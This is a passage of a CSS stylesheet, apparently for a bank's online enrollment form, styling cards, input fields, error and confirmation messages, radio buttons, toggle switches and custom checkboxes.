    padding: 20px 0px 10px 0px;
}

.bootstrap .confirmationfields .field {
    font-family: suntrustregular;
    font-weight: bold;
    font-size: 12px;
    color: #333333;
}

.bootstrap .confirmationfields .value {
    font-family: suntrustregular;
    font-size: 14px;
    color: #333333;
}

.bootstrap .confirmationfields .note-text {
    margin-top: 11px;
    color: #333333;
    font-size: 12px;
    font-weight: normal;
    line-height: normal;
}

.bootstrap .row-spacing {
    margin-top: 30px;
}

.bootstrap .card-body {
    -ms-flex: 1 1 auto;
    flex: 1 1 auto;
    padding: 0px 20px 0px 20px;
}

.bootstrap .card-footer {
    padding: 20px 0px 20px 0px;
    background-color: #F8F1E7;
    border-top: 0px;
}

    .bootstrap .card-footer a {
        border-radius: 4px 4px 4px 4px;
        background-color: #D55A2B;
        width: 104px;
        height: 35px;
        color: #FFFFFF;
        font-family: suntrustregular;
        outline: none;
        border: none;
        text-decoration: none;
        font-size: 12px;
        padding: 8px 0px 0px 0px;
    }


        .bootstrap .card-footer a:active, .bootstrap .card-footer a:focus {
            -moz-outline-style: none;
            outline: none;
            border: none;
        }

        .bootstrap .card-footer a:hover, .bootstrap .card-footer a:focus, .bootstrap .card-footer a:visited {
            border-radius: 4px 4px 4px 4px;
            background-color: #D55A2B;
            width: 104px;
            height: 35px;
            color: #FFFFFF;
            font-family: suntrustregular;
            outline: none;
            border: none;
            text-decoration: none;
            font-size: 12px;
            padding: 8px 0px 0px 0px;
        }


.bootstrap .customcard .card-title {
    font-family: "suntrustregular";
    font-weight: bold;
    font-size: 14px;
    color: #D55A2B;
}

.bootstrap .customcard .card-text {
    font-family: "suntrustregular";
    font-size: 12px;
    color: #333333;
    line-height: normal;
}

.sub-text-row-lock.locked .info-text:before {
    font-family: "olb-icons";
    display: inline-block;
    font-weight: normal;
    font-style: normal;
    text-decoration: inherit;
    content: "\e025";
    color: #ddd;
    font-size: 12px;
    margin: 0 6px;
    position: relative;
    margin-left: -8px;
}

.clickable-div {
    cursor: pointer;
}

.tooltip {
    pointer-events: none;
}

.tooltipinner {
    font-family: "suntrustregular","Trebuchet MS",sans-serif;
    font-size: 14px;
    background-color: transparent;
    font-weight: normal;
    font-style: normal;
}

.bootstrap .tooltip-inner {
    max-width: 300px;
    padding: 1.25rem 1.25rem 1.25rem 1.25rem;
    color: #fff;
    line-height: 1.5rem;
    text-align: left;
    background-color: #000;
    border-radius: 0;
}

/*****Chandra Start******/
/*********** Text Box ************/
input::-ms-clear {
    display: none;
}

.floatleft {
    float: left;
}

.btn:hover {
    color: #212529;
    text-decoration: none;
}

.floatright {
    float: right;
}

/*********** Text Box ************/
.sub-text-row-lock {
    color: rgb(112, 112, 112);
    color: #707070; /* darker gray text for WCAG 2 compliance */
    font-size: 12px;
    font-weight: normal;
    line-height: normal;
    margin: -10px 0 5px 40%;
    padding: 0 5px;
}

.print {
    display: inline-block;
    position: relative;
    margin: 2.8em 0 .5em 0;
    background: url(../images/Print_Icon.svg) no-repeat;
}

    .print span {
        display: inline-block;
        margin-left: 30px;
        line-height: 1.2em;
        font-weight: normal;
        font-family: suntrustregular;
        font-size: 12px;
        text-align: center;
        color: #005EAD;
    }

.bootstrap .customcard {
    background-color: #F8F1E7;
    border-radius: 4px 4px 4px 4px;
    min-height: 144px;
    vertical-align: middle;
    text-align: center;
    border: 0;
}

    .bootstrap .customcard:not(:last-child) {
        margin-right: 0px;
    }

.bootstrap .card-header {
    margin-bottom: 0;
    background-color: #F8F1E7;
    border-bottom: 0px;
    text-align: center;
    padding: 20px 0px 10px 0px;
}

.bootstrap .confirmationfields .field {
    font-family: suntrustregular;
    font-weight: bold;
    font-size: 12px;
    color: #333333;
}

.bootstrap .confirmationfields .value {
    font-family: suntrustregular;
    font-size: 14px;
    color: #333333;
}

.bootstrap .confirmationfields .note-text {
    margin-top: 11px;
    color: #333333;
    font-size: 12px;
    font-weight: normal;
    line-height: normal;
}

.bootstrap .row-spacing {
    margin-top: 30px;
}

.bootstrap .card-body {
    -ms-flex: 1 1 auto;
    flex: 1 1 auto;
    padding: 0px 20px 0px 20px;
}

.bootstrap .card-footer {
    padding: 20px 0px 20px 0px;
    background-color: #F8F1E7;
    border-top: 0px;
    text-align: center;
}

    .bootstrap .card-footer a {
        border-radius: 4px 4px 4px 4px;
        background-color: #C94C06;
        width: 104px;
        height: 35px;
        color: #FFFFFF;
        font-family: suntrustregular;
        font-size: 12px;
        padding: 7px 0px 0px 0px;
    }

.bootstrap .customcard .card-title {
    font-family: "suntrustregular";
    font-weight: bold;
    font-size: 19px;
    color: #C94C06;
}

.bootstrap .customcard .card-text {
    font-family: "suntrustregular";
    font-size: 12px;
    color: #333333;
    line-height: normal;
}

.sub-text-row-lock.locked .info-text:before {
    font-family: "olb-icons";
    display: inline-block;
    font-weight: normal;
    font-style: normal;
    text-decoration: inherit;
    content: "\e025";
    color: #ddd;
    font-size: 12px;
    margin: 0 6px;
    position: relative;
    margin-left: -8px;
}

.field-icon a {
    position: absolute;
    z-index: 1;
    font-family: suntrustregular;
    color: #005EAD;
    font-size: 12px;
}
/* Close Button on OLB Enrollement page Begin*/

.closeolb {
    position: relative;
    display: inline-block;
    width: 10px;
    height: 10px;
    overflow: hidden;
    margin-left: -8px;
}

    .closeolb.rounded::before, .closeolb.rounded::after {
        border-radius: 2px;
    }

    .closeolb::before, .closeolb::after {
        content: '';
        position: absolute;
        height: 2px;
        width: 100%;
        top: 50%;
        left: 0;
        text-align: left;
        background: #CCCCCC;
    }

    .closeolb::before {
        -webkit-transform: rotate(45deg);
        -moz-transform: rotate(45deg);
        -ms-transform: rotate(45deg);
        -o-transform: rotate(45deg);
        transform: rotate(45deg);
    }

    .closeolb::after {
        -webkit-transform: rotate(-45deg);
        -moz-transform: rotate(-45deg);
        -ms-transform: rotate(-45deg);
        -o-transform: rotate(-45deg);
        transform: rotate(-45deg);
    }
/* Close button in OLB Enrollement page end */
.close {
    position: relative;
    display: inline-block;
    width: 10px;
    height: 10px;
    overflow: hidden;
    margin-left: -8px;
}

.dot {
    position: relative;
    display: inline-block;
    width: 10px;
    height: 10px;
    overflow: hidden;
}

.close.rounded::before, .close.rounded::after {
    border-radius: 2px;
}

.dot::before {
    content: '';
    background: url(../images/Ellipse.svg) no-repeat;
    position: absolute;
    height: 16px;
    width: 16px;
    left: 0;
    top: 4px;
}

.close::before, .close::after {
    content: '.';
    position: absolute;
    height: 2px;
    width: 100%;
    top: 50%;
    left: 0;
    text-align: left;
    background: #CCCCCC;
}

.close::before {
    -webkit-transform: rotate(45deg);
    -moz-transform: rotate(45deg);
    -ms-transform: rotate(45deg);
    -o-transform: rotate(45deg);
    transform: rotate(45deg);
}

.close::after {
    -webkit-transform: rotate(-45deg);
    -moz-transform: rotate(-45deg);
    -ms-transform: rotate(-45deg);
    -o-transform: rotate(-45deg);
    transform: rotate(-45deg);
}

.invalidclose {
    position: relative;
    display: inline-block;
    width: 10px;
    height: 10px;
    overflow: hidden;
    margin-left: -8px;
}

    .invalidclose.rounded::before, .invalidclose.rounded::after {
        border-radius: 2px;
    }

    .invalidclose::before, .invalidclose::after {
        content: '';
        position: absolute;
        height: 2px;
        width: 100%;
        top: 50%;
        left: 0;
        text-align: left;
        background: #DB0018;
    }

    .invalidclose::before {
        -webkit-transform: rotate(45deg);
        -moz-transform: rotate(45deg);
        -ms-transform: rotate(45deg);
        -o-transform: rotate(45deg);
        transform: rotate(45deg);
    }

    .invalidclose::after {
        -webkit-transform: rotate(-45deg);
        -moz-transform: rotate(-45deg);
        -ms-transform: rotate(-45deg);
        -o-transform: rotate(-45deg);
        transform: rotate(-45deg);
    }

.checkmark {
    display: inline-block;
    margin-left: -8px;
    padding-right: 4px;
}

.tickmark {
    display: inline-block;
    padding-right: 4px;
}

    .tickmark:after {
        /*Add another block-level blank space*/
        content: '';
        display: block;
        /*Make it a small rectangle so the border will create an L-shape*/
        width: 4px;
        height: 8px;
        /*Add a white border on the bottom and left, creating that 'L' */
        border: solid #028477;
        border-width: 0 2px 2px 0;
        /*Rotate the L 45 degrees to turn it into a checkmark*/
        transform: rotate(45deg);
    }

    .tickmark.rounded::before, .tickmark.rounded::after {
        border-radius: 2px 2px 2px 2px;
    }

.valid {
    color: #028477;
}

.invalid {
    color: #DB0018;
}

.checkmark:after {
    /*Add another block-level blank space*/
    content: '';
    display: block;
    /*Make it a small rectangle so the border will create an L-shape*/
    width: 4px;
    height: 8px;
    /*Add a white border on the bottom and left, creating that 'L' */
    border: solid #028477;
    border-width: 0 2px 2px 0;
    /*Rotate the L 45 degrees to turn it into a checkmark*/
    transform: rotate(45deg);
}

.checkmark.rounded::before, .checkmark.rounded::after {
    border-radius: 2px 2px 2px 2px;
}

.full-input-default {
    width: 100%;
    height: 40px;
    display: inline-block;
    padding: 3px;
    border: 1px solid #CFCFCF;
    border-radius: 4px 4px 4px 4px;
    position: relative;
    margin: auto;
}

    .full-input-default .input {
        width: 95%;
        height: 100%;
        margin-top: 0;
        margin-left: 13px;
        outline: none;
        border: none;
        display: block;
        line-height: 1.2em;
    }

    .full-input-default .margin-top-textbox-link {
    }

    .full-input-default label {
        display: none;
    }

    .full-input-default .rightlink {
        display: none;
    }

.full-input {
    width: 100%;
    height: 40px;
    padding-top: 11px;
    display: inline-block;
    padding: 3px;
    border: 1px solid #005EAD;
    border-radius: 4px 4px 4px 4px;
    position: relative;
    margin: auto;
}

    .full-input .form-control:focus {
        box-shadow: none;
    }

    .full-input .input {
        width: 95%;
        height: 15px;
        margin-top: -5px;
        margin-left: -3px;
        outline: 0;
        border: 0;
        display: block;
        line-height: 1.2em;
    }

    .full-input .margin-top-textbox-link {
        margin-top: -18px;
    }

    .full-input label {
        display: block;
        margin-right: 20px;
        margin-top: -6px;
        margin-left: 5px;
        font-family: suntrustregular;
        color: #005EAD;
        font-size: 12px;
        width: 80%;
    }

    .full-input .rightlink, .full-input a {
        margin-right: 5px;
        text-align: right;
        /*margin-top: -12px;*/
        font-family: suntrustregular;
        font-size: 12px;
        color: #005EAD;
        text-decoration: none;
    }

.successmessage {
    color: #333333;
    font-family: suntrustregular;
    font-size: 12px;
}

.sub-label {
    color: #C94C06; /* was #ccc - darkened for WCAG AA compliance */
    font-size: 14px;
    font-weight: normal;
    line-height: normal;
}
.bootstrap-radio-sub-label {
    color: #333333; /* was #ccc - darkened for WCAG AA compliance */
    font-size: 16px;
    font-weight: normal;
    line-height: normal;
}
.bootstrap-radio-info-text {
color:#333333;
margin-top:25px;
    font-size: 14px;
    line-height: 16px;
}
.input-label {
    display: inline-block;
    font-weight: bold;
    text-align: left;
    width: 100%;
    padding-top: 11px;
    vertical-align: top;
}

.review-value {
    font-size: 20px;
    padding-top: 0px;
    font-weight: normal;
    word-wrap: break-word;
    max-width: 320px;
}

/* 19 M07 */
.input-row .input-label.empty {
    width: 5%;
}

.input-label.empty + .input-control {
    width: auto;
}

.input-row .input-label.blank {
    margin: 0;
    padding: 0;
    height: 0;
}

.input-row .input-label.top {
    vertical-align: top;
}

.input-row .input-label.middle {
    vertical-align: middle;
}

.input-row .input-label.bottom {
    vertical-align: bottom;
}

.input-row.checkbox-row .input-label {
    padding-top: 10px;
}


.numbered-instructions .input-control, .numbered-instructions .input-text {
    width: 85%;
}

.numbered-instructions .input-row .input-label {
    width: 14%;
}

.input-row .input-label .sub-label {
    color: #C94C06; /* was #ccc - darkened for WCAG AA compliance */
    font-size: 14px;
    font-weight: normal;
    line-height: normal;
    display: block;
}

/* hide the sub-labels in locked down input rows */
.input-row.locked .input-label .sub-label {
    display: none;
}
/* style the values in locked down input rows to look like disabled fields */
.input-row.locked .disabled-field-value {
    margin: 0;
    display: inline-block;
    padding: 9px 10px;
    background: #f5f5f5;
    color: #333;
    border: 1px solid #f5f5f5;
    border-radius: 4px;
    font-size: 16px;
    height: 40px;
    width: 60%;
    max-width: 250px;
    overflow: hidden;
    white-space: nowrap;
    text-overflow: ellipsis;
}

.bootstrap .disabled-field-value {
    margin: 0;
    display: inline-block;
    padding: 10px 0px 10px 10px;
    background: #f5f5f5;
    color: #333;
    border: 1px solid #f5f5f5;
    border-radius: 4px;
    font-size: 16px;
    height: 40px;
    width: 100%;
    max-width: 550px;
    overflow: hidden;
    white-space: nowrap;
    text-overflow: ellipsis;
}

.input-row.locked .input-control:after {
    font-family: "olb-icons";
    display: inline-block;
    font-weight: normal;
    font-style: normal;
    text-decoration: inherit;
    content: "\e025";
    color: #ddd;
    font-size: 25px;
    margin: 0 6px;
    position: relative;
    top: -12px;
    left: -5px;
}

.touchdev .input-row.locked .input-control:after {
    top: 0;
}

.input-row.checkbox-row .input-label .sub-label {
    white-space: nowrap;
}

.input-row.hasError .input-error:after {
    font-family: "olb-icons";
    display: inline-block;
    font-weight: normal;
    font-style: normal;
    text-decoration: inherit;
    content: "\e003";
    color: #ff3300;
    font-size: 25px;
    margin-right: 6px;
    position: relative;
    top: 3px;
}


.input-row.checksOut .input-conf:after {
    font-family: "sun-icons";
    display: inline-block;
    font-weight: normal;
    font-style: normal;
    text-decoration: inherit;
    content: "\f103";
    color: green;
    font-size: 21px;
    margin-right: 6px;
    position: relative;
    top: 5px;
    /* left:-35px; */
}

.input-row.checksOut .conf-message {
    display: block;
    font-size: 12px;
    font-weight: normal;
    line-height: normal;
    color: green;
    margin-left: 10px;
}

.conf-message {
    /* display:none; */
}

.input-control.hasError .error-message {
    display: block;
    font-size: 12px;
    font-weight: normal;
    line-height: normal;
    color: red;
    position: absolute;
    text-align: left;
    padding-left: 15px;
    margin-left: 0px;
    max-width: 195px;
    /* note:  this only works for a short error message of "This field is required."  If we later need longer messages, we need to create a different class, or remove position:absolute */
}

.ownership-error-txt {
    position: relative !important;
}
/*Added for 19.4*/
.input-control .info-message {
    font-size: 1.2rem;
    color: #707070;
    text-align: left;
    margin-left: 0px;
    max-width: 200px;
}


.input-row.hasError .error-message, .hasError .error-message {
    display: block;
    font-size: 12px;
    font-weight: normal;
    line-height: normal;
    color: red;
    margin-left: 10px;
}

.error-message {
    display: none;
}

.text-row {
    margin: 5px 0 5px 39%;
    padding: 0 5px;
}

.sub-text-row, .sub-text {
    color: rgb(112, 112, 112);
    color: #707070; /* darker gray text for WCAG 2 compliance */
    font-size: 12px;
    font-weight: normal;
    line-height: normal;
    margin: 5px 0 5px 40%;
    padding: 0 5px;
}

.note-text {
    color: rgb(112, 112, 112);
    color: #707070; /* darker gray text for WCAG 2 compliance */
    font-size: 12px;
    font-weight: normal;
    line-height: normal;
}

.sub-text {
    margin: inherit;
    padding: inherit;
}

.input-control .sub-text {
    margin-left: 10px;
}

    .input-control .sub-text#instructions {
        width: 70%;
        -webkit-transition: all 0s;
        transition: all 0s;
    }

.info-text {
    margin-top: 8px;
    font-size: 12px;
    font-size: 1.2rem;
    line-height: 16px;
    line-height: 1.6rem;
    color: #707070;
}
/*
.info-text:before {
	font-family: "olb-icons";
	display: inline-block;
	font-weight: normal;
	font-style: normal;
	text-decoration: inherit;
	content: "\e024";
	vertical-align: text-bottom;
	font-size: 14px;
	font-size: 1.4rem;
	color: #999999;
	margin-right: 5px;
}

removed for misuse 

*/
.addendum-text {
    margin-top: 8px;
    font-size: 14px;
    line-height: 16px;
    color: #707070;
    font-style: italic;
}

.addendum-copy {
    padding: 10px 10px 0 10px;
}

/* make a whole section readonly */
.readonly-section {
    color: #aaa;
}



/* switch-section for ".inline-radio" buttons (ie. yes-no radio buttons either inline or to replace toggles), acceptance-section, and green boxes */


.inline-radio .radio-container {
    display: inline-table;
    margin: 0 25px 0 0;
}

    .inline-radio .radio-container:last-of-type {
        margin-right: 5px;
    }

.switch-section.inline-radio .input-control {
    white-space: nowrap;
}

.switch-section.inline-radio .input-label {
    padding: 10px 0 10px 0;
}

.input-row.inline-radio .input-label {
    padding: 17px 5px 0px 10px;
}

.input-row.inline-radio .input-control .radio-combos {
    max-width: 240px;
    width: 60%;
    display: inline-block;
}

.input-row.inline-radio .input-label .sub-label {
    white-space: nowrap;
    display: inline-block;
}

.confimation-link {
    font-size: 1.5rem;
}

.bootstrap-radio {
    font-size: 31px;
    font-weight: normal !important;
    line-height: 1.5 !important;
}
.bootstrap-radio-container {

padding-top:11px;
text-align:right;
display:inline-block !important;
}
.bootstrap-radio-combos {
float:right;
}
.bootstrap-custom-radio + label {
    padding: 20px !important;
  
}

.bootstrap-radio-container label.content {
    display: inline-block !important;
    position: relative;
   padding: 0px 0px 10px 10px;
    margin-left: 10px;
    top: -10px;
    left: -5px;
    font-size: 18px;
  
}
.bootstrap-custom-radio:checked + label:after {
    content: ' ';
    width: 20px !important;
    height: 20px !important;
    left: 10px !important;
    top: 10px !important;
    border-radius: 50px;
    position: absolute;
    background: rgb(0, 41, 77);
    font-size: 32px;
}
/* Misc modifications to Getting Started page */


#show-hide {
    display: inline-block;
    position: relative;
    font-size: 12px;
    text-decoration: none;
    color: #003871;
    cursor: pointer;
    width: 0;
    height: 0;
    left: -60px;
    padding: 15px;
}
/* 
#show-hide {
    position:relative;   
    display:inline-block;
    padding-top: 0;
    width:0;
    height:0;
    left: -20px;
}

#show-hide:before {
    display:inline-block;
    top: 0px;
    color: #aaa;
    margin: 0 auto;
}
 */

ul#gs-req {
    list-style-type: none;
}

#gs-req.display li, #gs-req.display-tight li {
    /* handle multiline */
    overflow: visible;
    padding-left: 5px;
    position: relative;
    margin-left: 0;
}

    #gs-req.display li:before, #gs-req.display-tight li:before {
        /* your own marker in content */
        font-family: "olb-icons";
        content: "\e006";
        left: 0;
        position: absolute;
        left: -17px;
        top: 4px;
        color: #369;
        font-weight: normal;
        color: #ffa400;
        content: "\e006";
        font-family: olb-icons;
        font-size: 1.2rem;
        font-style: normal;
        font-weight: 400;
        line-height: 1;
        text-decoration: inherit;
    }

.forgot-useridpw {
    padding-top: 0px;
    margin-top: 0px;
    margin-bottom: 20px;
    font-size: 13px;
    position: relative;
    left: 60px;
    top: 0px;
}

.forgot-link {
}
/*
#promocode-section {
    background:#f4f4f4;
    border-radius:3px;
    margin:-27px 10px 10px 10px;
    padding:10px;
}*/

.promocode-trigger {
    color: #003871;
    cursor: pointer;
}

    .promocode-trigger a {
        margin-left: 0;
        padding-top: 50px;
    }

.promocode-trigger-text {
    cursor: pointer;
    color: #003871;
    /* font-weight:bold; */
    text-decoration: underline;
}

#delete-field {
    display: inline-block;
    position: relative;
    left: 5px;
    left: -71px; /* button inside input */
    top: -1px;
    text-decoration: none;
    width: 0;
    height: 0;
}

#df-control {
    display: inline-block;
    position: relative;
    font-size: 12px;
    font-weight: 500;
    text-decoration: none;
    color: #fff;
    border-radius: 4px;
    border: 0px solid #777;
    background: #003871;
    ;
    cursor: pointer;
    line-height: 1;
    padding: 7px 10px 6px 10px;
    text-align: center;
}


.radio-note {
    font-size: 13px;
    font-weight: 500;
    line-height: 1.3;
    color: #999;
    width: 250px;
    margin-top: 5px;
}

#client-yesno {
    margin-top: 5px;
}

    /*
#client-yesno .error-message {
   width:250px;
   margin-left:45px;
}
*/

    #client-yesno .input-error {
        float: left;
        position: relative;
        left: 3px;
    }

    #client-yesno .radio-combos {
        position: relative;
        top: -5px;
    }


.inline-radio .error-message {
    width: 250px;
    margin-left: 10px;
}

#client-yesno.inline-radio .input-error {
    float: none;
    position: auto;
    left: 0;
}

#client-yesno.inline-radio .radio-combos {
    position: auto;
    top: 0;
}


.offer-box {
    padding: 15px 25px;
    margin: 25px 0;
    background: #f4f4f4;
    border-radius: 4px;
    line-height: 1.5;
    font-size: 14px;
    border: 0px solid #eee;
}

/*
.offer-box-copy:before {
    content: "\25BA";
    color:#ccc;
    font-size: 100%;
    display: inline-block;
    pointer-events: none;
    padding:0 10px 0 0;
   
}
*/



.switch-section.modal-affirm {
    background-color: #fff;
    border-radius: 0;
    box-sizing: border-box;
    display: block;
    font-size: 1.5rem;
    margin: 0;
    padding: 1;
    text-align: left;
    width: 100%;
}



/* switch-section, acceptance-section, and green boxes */


/* the "mod-one" class allows us to re-structure the HTML so the "input-control" *follows* the "sub-label" content, thereby making it ADA compliant for screen readers.  Add "mod-one" class to the "switch section" div, then proceed to move the "sub-label" content right below the "input-label" div.  */

.switch-section.mod-one .input-control {
    position: absolute !important;
    top: 18px !important;
    right: 0 !important;
    display: inline-block !important;
    width: 120px !important;
}

.switch-section.mod-one .input-label {
    /* background:yellow;   -- for testing */
    display: block;
    width: -moz-calc(100% - 100px) !important;
    width: -webkit-calc(100% - 100px) !important;
    width: calc(100% - 100px) !important;
}

.switch-section.mod-one {
    position: relative !important;
}

/* end "mod-one" edits */

.tax-id-section {
    margin: 2em 0;
}

.Additionalowners {
    background: #F5F5F5 !important;
    border-radius: 4px;
    box-sizing: border-box;
    padding-left: 40px;
    padding-top: 30px;
    padding-bottom: 30px;
    margin: 1em 0 1em 0 !important;
}

.Additionalowners-label {
    font-size: 1.7rem;
}

.Additionalowners-checklist-label {
    font-size: 1.7rem;
    font-weight: normal;
}

Additionalowners-sub-label {
    font-size: 20px;
    font-weight: bold;
}

.owners-list {
    list-style: none;
    display: flex;
    margin-bottom: 0px !important;
}
/*.Additionalowners .form-input-control  {
    height:56px !important;
    }*/
/*.owners-list>li:nth-child(2) {
    margin-left:10px;
    }*/
.Additionalowners-note .info-text {
    padding-right: 20px;
    padding-top: 10px;
}

.percent-icon {
    font-size: 20px;
    font-weight: bold;
    line-height: 26px;
    position: relative;
    bottom: 35px;
    left: 100px;
}

.owners-list .first-label {
    margin-top: 3px;
}

.mobile-show {
    display: none !important;
}

.mobile-hide {
    display: block !important;
}

.switch-section {
    background-color: rgb(244, 244, 244);
    border-radius: 4px;
    box-sizing: border-box;
    display: block;
    font-size: 1.5rem;
    margin: 1em 0 1em 0;
    padding: 15px 10px;
    text-align: left;
    width: 100%;
}

    .switch-section.owners {
        background-color: rgb(244, 244, 244);
        border-radius: 4px;
        box-sizing: border-box;
        display: block;
        font-size: 1.5rem;
        margin: 1em 0 1em 0;
        padding: 15px 10px;
        text-align: left;
        width: 100%;
    }

/*div.switch-section {
    margin-top: 2em;
}*/

.switch-section .input-control {
    text-align: right;
    padding: 6px 0 0 30px;
    display: table-cell;
    width: 5%;
}

.switch-section .input-label {
    text-align: left;
    font-weight: 700;
    padding: 10px 0;
    display: table-cell;
}

.switch-section .sub-label {
    display: block;
    padding-top: 10px;
    /* margin-right:100px; */
    color: rgb(112, 112, 112);
    font-size: 14px;
    font-weight: normal;
    line-height: normal;
}

.switch-section .sub-label-regular {
    display: block;
    padding-top: 10px;
    /* margin-right:100px; */
    color: rgb(112, 112, 112);
    font-size: 14px;
    font-weight: normal;
    line-height: normal;
}

.switch-section .row-break {
    display: block;
}

.switch-section .input-label.account-name {
    padding: 15px 5px 15px 0;
}

.switch-section .input-label.app-name {
    padding: 15px 15px 15px 10px;
    margin: -17px -10px 0 -10px;
    display: block;
    font-weight: normal;
    font-style: italic;
    text-align: center;
    background: #ededed;
}

.switch-section .input-label.coapp-name {
    padding: 15px 15px 15px 10px;
    margin: 0 -10px 0 -10px;
    display: block;
    font-weight: normal;
    font-style: italic;
    text-align: center;
    background: #ededed;
}

.switch-section .input-label.details {
    text-align: right;
    font-weight: normal;
    padding: 15px 5px 15px 0;
}

.switch-section .input-control.card-select, .switch-section .input-control.cc-select, .switch-section .input-control.state-select, .switch-section .input-control.doctor-select {
    text-align: right;
    padding: 0;
}

    .switch-section .input-control.cc-select select {
        width: 50%;
        min-width: 185px;
        padding-right: 25px;
    }

    .switch-section .input-control.card-select select {
        width: 50%;
        min-width: 150px;
        padding-right: 25px;
    }



    .switch-section .input-control.state-select select {
        width: 50%;
        min-width: 185px;
        padding-right: 25px;
    }

    .switch-section .input-control.doctor-select select {
        width: 50%;
        min-width: 185px;
        padding-right: 25px;
    }

.switch-section .input-control.ownership-select input {
    width: 50%;
    min-width: 80px;
    padding-right: 25px;
}

    .switch-section .input-control.ownership-select input.perc, .switch-section .input-control.ownership-select input.perc-full {
        text-align: right;
        padding-right: 20px;
    }

.hasError .input-control.ownership-select .error-message {
    display: none;
}

.switch-section .input-control div.disabled-field {
    width: 50%;
    min-width: 80px;
    padding-right: 20px;
    text-align: right;
}

.switch-section .input-control.ownership-select input[type="text"]:disabled {
    background: #eee !important;
    color: #aaa !important;
}


.ie .switch-section .input-control.card-select select,
.ie-plus .switch-section .input-control.card-select select,
.ie .switch-section .input-control.cc-select select,
.ie-plus .switch-section .input-control.cc-select select,
.ie .switch-section .input-control.state-select select,
.ie-plus .switch-section .input-control.state-select select,
.ie .switch-section .input-control.doctor-select select,
.ie-plus .switch-section .input-control.doctor-select select {
    padding-right: 0;
}

.ie9 .switch-section .input-control.card-select select,
.ie9 .switch-section .input-control.cc-select select,
.ie9 .switch-section .input-control.state-select select,
.ie9 .switch-section .input-control.doctor-select select {
    padding-right: 0;
    width: 175px;
}


.switch-section .input-control.doctor-select select option,
.switch-section .input-control.state-select select option,
.switch-section .input-control.card-select select option,
.switch-section .input-control.cc-select select option {
    background: #fff;
}

.acceptance-section {
    display: table;
    padding: 1.5em 10px;
    background: #f4f4f4;
    border-radius: 4px;
    margin: 2em 0;
}

    .acceptance-section .input-control {
        display: table-cell;
        width: 55px;
        vertical-align: top;
    }

    .acceptance-section .input-label {
        display: table-cell;
        font-weight: bold;
        padding-right: 10px;
    }

    .acceptance-section input, .acceptance-section label {
        cursor: pointer;
    }

/* Add space to read-disclosure checkboxes to top-align box */
input[type="checkbox"].custom-checkbox.read-disclosure + label {
    margin-bottom: 20px;
}

.disclosure-check {
    /* background-color:#deeefe;  */
}

    .disclosure-check label {
        /* color: #003871;  */
    }

.disclosure-sub-text {
    white-space: nowrap;
    display: block;
    margin-top: -2px;
}

    /* white-on-gray box treatment -->

.disclosure-sub-text .wrapper{
    display:inline-block;  
    font-style:italic;
    font-size:12px;
    font-weight:normal;
    color:#fff;
    background:#a5a5a5;
    border-radius:1px;
    padding:1px 5px; 
    line-height: 17px;      
}
 */

    .disclosure-sub-text .wrapper {
        display: inline-block;
        font-style: normal;
        font-size: 12px;
        font-weight: bold;
        color: #777;
        padding: 0;
        line-height: 17px;
    }


        .disclosure-sub-text .wrapper .verbatim {
            text-transform: uppercase;
        }

        .disclosure-sub-text .wrapper .divider:before {
            content: "\2022";
            padding: 0 3px;
        }

.switch-on.disclosure-check label {
    /* color:#333; */
}

    .switch-on.disclosure-check label.desc .instruction {
        display: none;
    }

.greenbox {
    border: 1px solid rgb(244, 244, 244);
}

.switch-on {
    /* background-color:#eee !important; / gray bg */
}

    .switch-on .checkbox-toggle-on {
        /* background-color:green !important; */
    }

    /* .switch-on label.desc  {
	color:green !important;
    display:block;
    text-align:right;
    font-size:12px;
    -webkit-transition: all 0.5s ease-out;  SAFARI
    transition: all 0.5s ease-out;   

} */

    .switch-on .custom-checkbox:checked + label:after, .switch-on .custom-checkbox:checked + label {
        /* background-color:green !important;
    border-color:green !important; */
        background-color: #003871 !important;
        border-color: #003871 !important;
    }




/* Checkbox TOGGLE SWITCH */


.checkbox-toggle, .checkbox-toggle-disabled {
    background-color: #C94C06;
    width: 80px;
    height: 32px;
    border-radius: 20px;
    position: relative;
    cursor: pointer;
    display: block;
}


    .checkbox-toggle .checkbox-toggle-on-value, .checkbox-toggle-disabled .checkbox-toggle-on-value,
    .checkbox-toggle .checkbox-toggle-off-value, .checkbox-toggle-disabled .checkbox-toggle-off-value {
        display: none;
        line-height: 32px;
        line-height: 3.2rem;
        font-weight: bold;
        font-size: 1.2rem;
        text-align: center;
        color: #ffffff;
        width: 54px;
        height: 32px;
    }

    .checkbox-toggle .checkbox-toggle-switch, .checkbox-toggle-disabled .checkbox-toggle-switch {
        position: absolute;
        top: 3px;
        width: 26px;
        height: 26px;
        border-radius: 50%;
        -webkit-transition: all 100ms ease;
        transition: all 100ms ease;
        background-color: #ffffff;
    }

    .checkbox-toggle .input-checkbox, .checkbox-toggle-disabled .input-checkbox {
        border: 0;
        clip: rect(0 0 0 0);
        height: 1px;
        top: -1px;
        overflow: hidden;
        padding: 0;
        position: absolute;
        width: 1px;
    }

    .checkbox-toggle.checkbox-toggle-on, .checkbox-toggle-disabled.checkbox-toggle-on {
        background-color: #003871;
    }

    .checkbox-toggle.checkbox-toggle-off .checkbox-toggle-off-value, .checkbox-toggle-disabled.checkbox-toggle-off .checkbox-toggle-off-value {
        float: right;
        display: block;
    }

    .checkbox-toggle.checkbox-toggle-off .checkbox-toggle-switch, .checkbox-toggle-disabled.checkbox-toggle-off .checkbox-toggle-switch {
        left: 3px;
    }

    .checkbox-toggle.checkbox-toggle-on .checkbox-toggle-on-value, .checkbox-toggle-disabled.checkbox-toggle-on .checkbox-toggle-on-value {
        float: left;
        display: block;
    }

    .checkbox-toggle.checkbox-toggle-on .checkbox-toggle-switch, .checkbox-toggle-disabled.checkbox-toggle-on .checkbox-toggle-switch {
        left: 51px;
    }


.bigswitch .checkbox-toggle-disabled .checkbox-toggle-on-value, .bigswitch .checkbox-toggle-disabled .checkbox-toggle-on-value,
.bigswitch .checkbox-toggle-disabled .checkbox-toggle-off-value, .bigswitch .checkbox-toggle-disabled .checkbox-toggle-off-value {
    font-size: 1.1rem;
}

.checkbox-toggle-disabled {
    filter: progid:DXImageTransform.Microsoft.Alpha(Opacity=0.33);
    opacity: 0.33;
}

/* Custom controls adapted from -  http://www.inserthtml.com/2012/06/custom-form-radio-checkbox/     */
/* Not supported in IE8, need to create ".ie" classes to clawback these styles for lte IE8 and degrade to native controls  */


/* Old Fashioned CHECKBOX */

.custom-checkbox {
    display: inline;
    z-index: -999;
    filter: progid:DXImageTransform.Microsoft.Alpha(Opacity=0);
    opacity: 0;
    overflow: hidden;
    position: absolute;
    left: -99999px;
}

.checkbox-container label {
    cursor: pointer;
}

    .checkbox-container label.content {
        display: inline-block;
